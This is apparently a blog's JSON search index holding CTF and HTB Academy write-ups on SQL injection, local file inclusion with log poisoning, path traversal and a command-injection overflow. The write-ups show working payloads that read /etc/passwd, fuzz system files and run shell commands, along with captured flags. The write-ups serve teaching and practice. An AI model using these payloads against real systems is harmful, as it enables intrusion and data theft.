2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($result[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;id\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;guest\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hi guest\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($result[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;id\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esolve\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hi admin!\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOur goal seems to be creating a payload that would make the \u003ccode\u003eid\u003c/code\u003e value \u003ccode\u003eadmin\u003c/code\u003e and also make the \u003ccode\u003eno\u003c/code\u003e value \u003ccode\u003e2\u003c/code\u003e. So, let\u0026rsquo;s assume that there is no filter so we can enter anything as a payload. When we enter \u003ccode\u003e2\u003c/code\u003e as our input, you will see something like this:\u003c/p\u003e","title":"webhackingkr-old-18"},{"content":"Identifying the Local File Inclusion (LFI) Vulnerability While working on the skills assessment for the File Inclusion module, I first checked whether the target website was vulnerable to Local File Inclusion (LFI). The website had a query parameter called page in the URL, as shown below:\nhttp://\u0026lt;IP\u0026gt;/index.php?page=\u0026lt;page name\u0026gt; When I attempted to traverse directories using relative paths, like ../../../../etc/passwd, I encountered an error message: \u0026ldquo;Invalid input detected!\u0026rdquo;.\nDirectory Enumeration with ffuf To explore available pages on the site, I used the ffuf tool to fuzz the directories:\nffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.196:43781/FUZZ.php The results provided me with several pages, such as about.php, contact.php, and error.php. This gave me more insight into the structure of the site:\n└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.255.196:43781/FUZZ.php /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://83.136.255.196:43781/FUZZ.php :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ # [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 100ms] # directory-list-2.3-small.txt [Status: 200, Size: 15829, Words: 3435, Line about [Status: 200, Size: 10313, Words: 2398, Lines: 214, # [Status: 200, Size: 15829, Words: 3435, Lines: 401, # This work is licensed under the Creative Commons [Status: 200, Size: 1582 # license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 20 # [Status: 200, Size: 15829, Words: 3435, Lines: 401, # on at least 3 different hosts [Status: 200, Size: 15829, Words: 3435, Lin contact [Status: 200, Size: 2714, Words: 773, Lines: 78, Du # Copyright 2007 James Fisher [Status: 200, Size: 15829, Words: 3435, Lines # [Status: 200, Size: 15829, Words: 3435, Lines: 401, # Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, # or send a letter to Creative Commons, 171 Second Street, [Status: 200, Si index [Status: 200, Size: 15829, Words: 3435, Lines: 401, # Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 158 # Priority-ordered case-sensitive list, where entries were found [Status: 2 main [Status: 200, Size: 11507, Words: 2639, Lines: 284, industries [Status: 200, Size: 8082, Words: 2018, Lines: 197, error [Status: 200, Size: 199, Words: 41, Lines: 10, Dura :: Progress: [87664/87664] :: Job [1/1] :: 393 req/sec :: Duration: [0:03:5 Analyzing the Source Code for Clues PHP Source Code Review - Trying PHP Filters By viewing the source code of the index.php page, I discovered the following PHP code snippet:\nBase64 decoded source code:\n\u0026lt;?php if(!isset($_GET[\u0026#39;page\u0026#39;])) { include \u0026#34;main.php\u0026#34;; } else { $page = $_GET[\u0026#39;page\u0026#39;]; if (strpos($page, \u0026#34;..\u0026#34;) !== false) { include \u0026#34;error.php\u0026#34;; } else { include $page . \u0026#34;.php\u0026#34;; } } ?\u0026gt; This showed that the page was using the include function to dynamically load different PHP pages. While the script includes a basic check to prevent directory traversal (strpos($page, \u0026ldquo;..\u0026rdquo;)), there might still be ways to bypass this.\nUnused Admin Page While exploring further, I found a commented-out section in the PHP source code:\n\u0026lt;?php // echo \u0026#39;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;ilf_admin/index.php\u0026#34;\u0026gt;Admin\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#39;; ?\u0026gt; Although commented out, it suggested an admin page might exist, which could be a potential target for further investigation.\nExploiting the Admin Page for LFI Bypassing Path Traversal Protection When I accessed the admin page at:\nhttp://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../etc/passwd It appeared that the path traversal protection was missing on this page, as I was able to successfully read /etc/passwd.\nI used ffuf again to search for files that could be accessed via LFI on this page:\nffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt:FUZZ -u \u0026#39;http://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../FUZZ\u0026#39; -fs 2046 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://83.136.254.47:31827/ilf_admin/index.php?log=../../../../../FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 2046 ________________________________________________ :: Progress: [1/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00::: Progress: [40/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [44/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [63/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00/etc/ca-certificates.conf [Status: 200, Size: 7659, Words: 163, Lines: 242, Duration: 104ms] :: Progress: [72/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [82/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:: Progress: [128/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/fstab [Status: 200, Size: 2135, Words: 154, Lines: 104, Duration: 100ms] :: Progress: [128/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/group- [Status: 200, Size: 2761, Words: 150, Lines: 151, Duration: 99ms] :: Progress: [132/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/group [Status: 200, Size: 2766, Words: 150, Lines: 151, Duration: 100ms] :: Progress: [134/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/hostname [Status: 200, Size: 2093, Words: 150, Lines: 103, Duration: 98ms] :: Progress: [136/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/hosts [Status: 200, Size: 2290, Words: 155, Lines: 110, Duration: 98ms] :: Progress: [139/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/inittab [Status: 200, Size: 2616, Words: 196, Lines: 125, Duration: 97ms] :: Progress: [163/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/issue [Status: 200, Size: 2100, Words: 159, Lines: 105, Duration: 100ms] :: Progress: [167/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [181/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/modules [Status: 200, Size: 2061, Words: 150, Lines: 104, Duration: 100ms] :: Progress: [189/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/motd [Status: 200, Size: 2329, Words: 183, Lines: 112, Duration: 98ms] :: Progress: [193/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/mtab [Status: 200, Size: 4332, Words: 260, Lines: 124, Duration: 103ms] :: Progress: [201/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/nginx/nginx.conf [Status: 200, Size: 4965, Words: 934, Lines: 196, Duration: 98ms] :: Progress: [207/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/os-release [Status: 200, Size: 2210, Words: 153, Lines: 108, Duration: 100ms] :: Progress: [209/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 97ms] :: Progress: [212/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/passwd- [Status: 200, Size: 3218, Words: 152, Lines: 129, Duration: 98ms] :: Progress: [214/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/profile [Status: 200, Size: 2284, Words: 199, Lines: 112, Duration: 99ms] :: Progress: [233/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [242/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0/etc/resolv.conf [Status: 200, Size: 2152, Words: 155, Lines: 105, Duration: 101ms] :: Progress: [247/772] :: Job [1/1] :: 0 req/sec :: Duration: [0:0:: Progress: [282/772] :: Job [1/1] :: 423 req/sec :: Duration: [0/etc/sysctl.conf [Status: 200, Size: 2099, Words: 157, Lines: 103, Duration: 100ms] :: Progress: [297/772] :: Job [1/1] :: 399 req/sec :: Duration: [0:: Progress: [325/772] :: Job [1/1] :: 396 req/sec :: Duration: [0:: Progress: [382/772] :: Job [1/1] :: 403 req/sec :: Duration: [0/proc/cpuinfo [Status: 200, Size: 6858, Words: 758, Lines: 210, Duration: 98ms] :: Progress: [404/772] :: Job [1/1] :: 396 req/sec :: Duration: [0/proc/self/cmdline [Status: 200, Size: 2064, Words: 152, Lines: 102, Duration: 97ms] :: Progress: [405/772] :: Job [1/1] :: 395 req/sec :: Duration: [0/proc/devices [Status: 200, Size: 2406, Words: 208, Lines: 137, Duration: 99ms] :: Progress: [406/772] :: Job [1/1] :: 379 req/sec :: Duration: [0/proc/meminfo [Status: 200, Size: 3549, Words: 665, Lines: 156, Duration: 99ms] :: Progress: [407/772] :: Job [1/1] :: 380 req/sec :: Duration: [0/proc/self/environ [Status: 200, Size: 2544, Words: 151, Lines: 102, Duration: 98ms] :: Progress: [408/772] :: Job [1/1] :: 380 req/sec :: Duration: [0/proc/net/udp [Status: 200, Size: 2174, Words: 185, Lines: 103, Duration: 100ms] :: Progress: [409/772] :: Job [1/1] :: 383 req/sec :: Duration: [0:: Progress: [426/772] :: Job [1/1] :: 386 req/sec :: Duration: [0/proc/self/mounts [Status: 200, Size: 4332, Words: 260, Lines: 124, Duration: 100ms] :: Progress: [426/772] :: Job [1/1] :: 386 req/sec :: Duration: [0/proc/self/stat [Status: 200, Size: 2360, Words: 201, Lines: 103, Duration: 101ms] :: Progress: [427/772] :: Job [1/1] :: 385 req/sec :: Duration: [0/proc/self/status [Status: 200, Size: 3482, Words: 245, Lines: 159, Duration: 101ms] :: Progress: [428/772] :: Job [1/1] :: 383 req/sec :: Duration: [0/proc/version [Status: 200, Size: 2234, Words: 170, Lines: 103, Duration: 100ms] :: Progress: [428/772] :: Job [1/1] :: 383 req/sec :: Duration: [0/proc/net/tcp [Status: 200, Size: 145296, Words: 57576, Lines: 1057, Duration: 103ms] :: Progress: [456/772] :: Job [1/1] :: 377 req/sec :: Duration: [0:: Progress: [481/772] :: Job [1/1] :: 392 req/sec :: Duration: [0:: Progress: [524/772] :: Job [1/1] :: 398 req/sec :: Duration: [0:: Progress: [570/772] :: Job [1/1] :: 394 req/sec :: Duration: [0:: Progress: [619/772] :: Job [1/1] :: 380 req/sec :: Duration: [0:: Progress: [662/772] :: Job [1/1] :: 373 req/sec :: Duration: [0:: Progress: [716/772] :: Job [1/1] :: 381 req/sec :: Duration: [0:: Progress: [751/772] :: Job [1/1] :: 352 req/sec :: Duration: [0:: Progress: [772/772] :: Job [1/1] :: 337 req/sec :: Duration: [0/var/log/nginx/error.log [Status: 200, Size: 4818137, Words: 499546, Lines: 8226, Duration: 165ms] :: Progress: [772/772] :: Job [1/1] :: 313 req/sec :: Duration: [0/var/log/nginx/access.log [Status: 200, Size: 12453264, Words: 1439410, Lines: 96026, Duration: 281ms] :: Progress: [772/772] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:06] :: Errors: 0 :: This revealed that the server used Nginx!\nAchieving Remote Code Execution (RCE) By inspecting the logs in /var/log/nginx/access.log, I found an opportunity to inject PHP code for a shell. Using Burp Suite, I sent a request that included a PHP shell command, and it worked, allowing me to execute arbitrary commands on the server:\nI was able to successfully retrieve the flag:\nLessons Learned Importance of Reviewing Source Code One key takeaway from this assessment is the importance of reviewing the source code carefully. Initially, I spent too much time trying to exploit the site without realizing that a vulnerable admin page was clearly hinted at in the source code.\nAutomating with Tools Although I got lucky finding the path traversal vulnerability, using tools like ffuf earlier could have saved me time and effort in identifying other possible vulnerabilities.\nReference For additional insights, I looked at how others approached this challenge, which was helpful for refining my method: Solving the Skills Assessment: File Inclusion and Log Poisoning.\n","permalink":"https://joonkim0625.github.io/posts/2024-10-13-htb-academy-file-inclusion-skills-assessment/","summary":"\u003ch2 id=\"identifying-the-local-file-inclusion-lfi-vulnerability\"\u003eIdentifying the Local File Inclusion (LFI) Vulnerability\u003c/h2\u003e\n\u003cp\u003eWhile working on the skills assessment for the File Inclusion module, I first checked whether the target website was vulnerable to Local File Inclusion (LFI). The website had a query parameter called page in the URL, as shown below:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://\u0026lt;IP\u0026gt;/index.php?page=\u0026lt;page name\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWhen I attempted to traverse directories using relative paths, like \u003ccode\u003e../../../../etc/passwd\u003c/code\u003e, I encountered an error message: \u0026ldquo;\u003cstrong\u003eInvalid input detected!\u003c/strong\u003e\u0026rdquo;.\u003c/p\u003e\n\u003ch2 id=\"directory-enumeration-with-ffuf\"\u003eDirectory Enumeration with ffuf\u003c/h2\u003e\n\u003cp\u003eTo explore available pages on the site, I used the ffuf tool to fuzz the directories:\u003c/p\u003e","title":"HTB Academy File Inclusion Skills Assessment"},{"content":"Page Source Inspection The actual functionality of uploading and downloading files weren\u0026rsquo;t working so I looked at the page source. I saw this portion of the source:\nconst searchFile = async () =\u0026gt; { let formData = new FormData(searchForm); console.log([...formData][0]); let response = await fetch(\u0026#39;/search/\u0026#39; + [...formData][0][1], { method: \u0026#39;GET\u0026#39;, }); searchWrapper.hidden = false; if (response.status === 200) { searchMessage.innerHTML = \u0026#39;File found. Download link: \u0026lt;a href=\u0026#34;/download/\u0026#39; + [...formData][0][1] + \u0026#39;\u0026#34;\u0026gt;Download\u0026lt;/a\u0026gt;\u0026#39;; } else { searchMessage.innerHTML = \u0026#39;File not found.\u0026#39;; } } If we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:\nsearchMessage.innerHTML = \u0026#39;File found. Download link: \u0026lt;a href=\u0026#34;/download/\u0026#39; + [...formData][0][1] + \u0026#39;\u0026#34;\u0026gt;Download\u0026lt;/a\u0026gt;\u0026#39;; So, when I tried to access the /download/flag.txt, I got an error message back:\n└─$ curl https://ssfs.challs.pwnoh.io/download/flag.txt {\u0026#34;message\u0026#34;:\u0026#34;File not found\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;error\u0026#34;} So, I assumed that this could be a path traversal related challenge (and also given that this is the very first challenge in the Web category). But when I tried a few different paths such as /download/../flag.txt or /download/../../flag.txt, I got an error that the URL was not found. When I looked at the web browser, my initial request address was resolved to https://ssfs.challs.pwnoh.io/flag.txt instead. This is because of the Path Normalization.\nPath Normalization Path Normalization is the process of transforming a URL\u0026rsquo;s path into a standard, canonical form. For example, if someone is trying to path traverse to access some secret file:\nhttp://example.com/download/../../etc/passwd This will resolve to:\nhttp://example.com/download/etc/passwd In order to ignore(?) this, I learned that I can use curl\u0026rsquo;s --path-as-is option to test possible path traversal vulnerability. Once I learned how to use this option, it was a basic path traversal challenge.\nSolve So, if we try something like this, we can get the flag:\n└─$ curl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt bctf{4lw4y5_35c4p3_ur_p4th5} ","permalink":"https://joonkim0625.github.io/posts/2024-10-07-buckeyectf-2024-ssfs/","summary":"\u003ch2 id=\"page-source-inspection\"\u003ePage Source Inspection\u003c/h2\u003e\n\u003cp\u003eThe actual functionality of uploading and downloading files weren\u0026rsquo;t working so I looked at the page source. I saw this portion of the source:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econst searchFile = async () =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tlet formData = new FormData(searchForm);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tconsole.log([...formData][0]);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tlet response = await fetch(\u0026#39;/search/\u0026#39; + [...formData][0][1], {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tmethod: \u0026#39;GET\u0026#39;,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t});\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tsearchWrapper.hidden = false;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tif (response.status === 200) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tsearchMessage.innerHTML = \u0026#39;File found. Download link: \u0026lt;\u003cspan style=\"color:#f92672\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehref\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/download/\u0026#39; + [...formData][0][1] + \u0026#39;\u0026#34;\u003c/span\u003e\u0026gt;Download\u0026lt;/\u003cspan style=\"color:#f92672\"\u003ea\u003c/span\u003e\u0026gt;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} else {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\tsearchMessage.innerHTML = \u0026#39;File not found.\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIf we look closer, once a file is found from the search bar (or the search functionality), there will be a linked provided by the site that accesses the path of that file:\u003c/p\u003e","title":"BuckeyeCTF 2024 - SSFS"},{"content":"Beginner pwn: First challenge #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char command[110] = \u0026#34;cowsay \\\u0026#34;\u0026#34;; char message[100]; printf(\u0026#34;Give me a message to say!\\n\u0026#34;); fflush(stdout); fgets(message, 0x100, stdin); strncat(command, message, 98); strncat(command, \u0026#34;\\\u0026#34;\u0026#34;, 2); system(command); It has been a while since I have done any CTFs! So I struggled a little bit looking at the code and what they do.\nWhen I pass 109 A\u0026rsquo;s, it still runs the cowsay bin.\nWhen you pass in 113 A\u0026rsquo;s, the output starts to show a single \u0026lsquo;A\u0026rsquo;:\n└─$ python -c \u0026#34;print(\u0026#39;A\u0026#39; * 113)\u0026#34; | ./runway0 Give me a message to say! sh: 1: A: not found sh: 2: Syntax error: Unterminated quoted string This tells you that we have been able to wipe out the original value cowsay \u0026quot; with a single A. So, we can safely assume that with 112 A\u0026rsquo;s and a shell command can give us some information about the target machine:\n└─$ python -c \u0026#34;print(\u0026#39;A\u0026#39; * 112 + \u0026#39;id\u0026#39;)\u0026#34; | ./runway0 Give me a message to say! uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),117(bluetooth),121(wireshark),127(scanner),134(vboxsf),135(kaboxer) sh: 2: Syntax error: Unterminated quoted string I was able to get the flag:\n└─$ python -c \u0026#34;print(\u0026#39;A\u0026#39; * 112 + \u0026#39;ls\u0026#39;)\u0026#34; | nc challs.pwnoh.io 13400 Give me a message to say! flag.txt run sh: 2: Syntax error: Unterminated quoted string ... └─$ python -c \u0026#34;print(\u0026#39;A\u0026#39; * 112 + \u0026#39;cat flag.txt\u0026#39;)\u0026#34; | nc challs.pwnoh.io 13400 Give me a message to say! bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}sh: 2: Syntax error: Unterminated quoted string Why this works is because the fgets will add a null character at the end of the message variable. So, if we input 100 A\u0026rsquo;s into the message variable, it will look something like AAA...AAA\\n\\000 (fgets reads up n bytes specified or an EOF or a newline - refer to the manpage). So, with 110 A\u0026rsquo;s, we are right before the character \u0026lsquo;c\u0026rsquo;:\nwndbg\u0026gt; x/10c 0x7fffffffdcf0 - 9 0x7fffffffdce7: 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 10 \u0026#39;\\n\u0026#39; 0x7fffffffdcef: 0 \u0026#39;\\000\u0026#39; 99 \u0026#39;c\u0026#39; I ran the program in pwndbg to see how this was happening exactly. Now, as you can imagine, if we pass in 111 A\u0026rsquo;s, the null character will take up the \u0026lsquo;c\u0026rsquo;:\nx7fffffffdce8: 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 10 \u0026#39;\\n\u0026#39; 0x7fffffffdcf0: 0 \u0026#39;\\000\u0026#39; 111 \u0026#39;o\u0026#39; So, with 113 A\u0026rsquo;s, we see something like this:\nx7fffffffdcee: 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 65 \u0026#39;A\u0026#39; 10 \u0026#39;\\n\u0026#39; 97 \u0026#39;a\u0026#39; 121 \u0026#39;y\u0026#39; 0x7fffffffdcf6: 32 \u0026#39; \u0026#39; 34 \u0026#39;\u0026#34;\u0026#39; So, the A\u0026rsquo;s and the newline character has taken the first four characters cows (I am sure the null byte disappears because of message having more than 100 bytes of stuff). So this is why/how we are able to enter the command we want to run by calculating the offset correctly. The system function will first execute the command that it reads up to the \\n, and then try to execute whatever comes the next. That is why you are seeing the error message of sh: 2: Syntax error: Unterminated quoted string - there is an ending double quote but the opening double quote is overwritten by our payload.\nPlease feel free to contact me if this article includes any wrong information!\n","permalink":"https://joonkim0625.github.io/posts/2024-10-06-ctf-buckeyectf-2024-runway0/","summary":"\u003ch2 id=\"beginner-pwn-first-challenge\"\u003eBeginner pwn: First challenge\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e command[\u003cspan style=\"color:#ae81ff\"\u003e110\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cowsay \u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e message[\u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Give me a message to say!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efflush\u003c/span\u003e(stdout);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efgets\u003c/span\u003e(message, \u003cspan style=\"color:#ae81ff\"\u003e0x100\u003c/span\u003e, stdin);\n\u003c/span\u003e\u003c/span\u003e\u003cspan 